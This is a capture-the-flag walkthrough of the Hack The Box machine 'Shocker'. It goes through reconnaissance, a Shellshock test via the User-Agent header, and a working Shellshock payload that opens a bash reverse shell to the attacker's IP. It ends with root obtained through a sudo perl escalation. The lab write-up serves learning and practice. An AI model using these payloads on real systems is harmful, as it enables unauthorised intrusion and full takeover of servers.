# recon
- 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
- 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
2222 -> rabbit hole...

## gobuster 
- /
```
/cgi-bin/ (Status: 403)
/cgi-bin/.html (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
```
- /cgi-bin/ since it is a linux then looking for .sh
```
user.sh
```
when GET / -> return
```

Content-Type: text/plain

Just an uptime test script

 10:15:49 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
```
shocker??? -> shell shock.

looking at this 
- https://github.com/s4n7h0/NSE/blob/master/http-shellshock.nse
- https://book.hacktricks.xyz/pentesting/pentesting-web/cgi#shellshock

try it out.
```
kali@kali:~/HTB/shocker$ curl -H 'User-Agent: () { :; }; echo; echo "VULNERABLE TO SHELLSHOCK"' http://shocker.htb/cgi-bin/user.sh 2>/dev/null
VULNERABLE TO SHELLSHOCK

Content-Type: text/plain

Just an uptime test script

 10:15:49 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
```

# foot hold

the victim server is vulnerable to shell shock. so let try to craft a bash reverse shell

```
kali@kali:~/HTB/shocker$ curl -H 'User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.8/6969 0>&1' http://shocker.htb/cgi-bin/user.sh 2>/dev/null
```
nc listen to port 6969
```
kali@kali:~/HTB/shocker$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.56] 33820
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```
go grab user flag

# root

run `linpeas.sh`
```
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

**GTFObin**: sudo perl -e 'exec "/bin/bash";'

```
shelly@Shocker:/home/shelly$  sudo perl -e 'exec "/bin/bash";'
 sudo perl -e 'exec "/bin/bash";'
root@Shocker:/home/shelly# whoami
whoami
root
```
go grab root flag.